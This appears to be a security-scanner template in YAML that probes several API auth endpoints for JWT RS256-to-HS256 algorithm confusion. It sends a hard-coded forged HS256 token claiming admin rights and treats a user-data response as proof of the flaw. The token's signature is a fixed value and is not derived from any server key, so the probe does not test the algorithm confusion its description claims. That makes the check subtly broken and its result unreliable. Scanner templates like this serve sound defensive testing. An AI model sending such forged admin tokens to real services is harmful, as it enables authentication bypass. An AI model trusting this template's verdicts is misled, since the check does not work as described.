id: jwt-algorithm-confusion
info:
  name: JWT Algorithm Confusion RS256 to HS256
  severity: critical
  tags: [jwt, authentication, api, algorithm-confusion, auth-bypass, api-graphql-security]
  description: "When a server uses RS256 to verify JWTs but also accepts HS256, an attacker can forge tokens by signing them with the RSA public key as the HMAC secret. The server unknowingly verifies the attacker's token because it uses the same known-public key as the HMAC secret."
  remediation: "Enforce a strict algorithm allowlist server-side; never derive the algorithm from the token header. Reject HS256 tokens when the system is configured for RS256."
  cwe: "CWE-327"
  owasp: "A02:2021-Cryptographic Failures"

requests:
  - method: POST
    paths:
      - /api/auth/verify
      - /api/v1/auth/verify
      - /api/token/verify
      - /api/me
      - /api/v1/me
      - /api/user
    headers:
      Content-Type: "application/json"
      Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6InRlc3QiLCJpYXQiOjE1MTYyMzkwMjIsImFkbWluIjp0cnVlfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
      Accept: "application/json"

    matchers-condition: and
    matchers:
      - type: status
        status: [200, 201]
      - type: regex
        regex:
          - "\"(sub|user_id|id|email|name|role|admin)\"\\s*:"
        part: body
      - type: word
        words:
          - "Unauthorized"
          - "Invalid token"
          - "invalid signature"
          - "token expired"
          - "jwt malformed"
        part: body
        negative: true
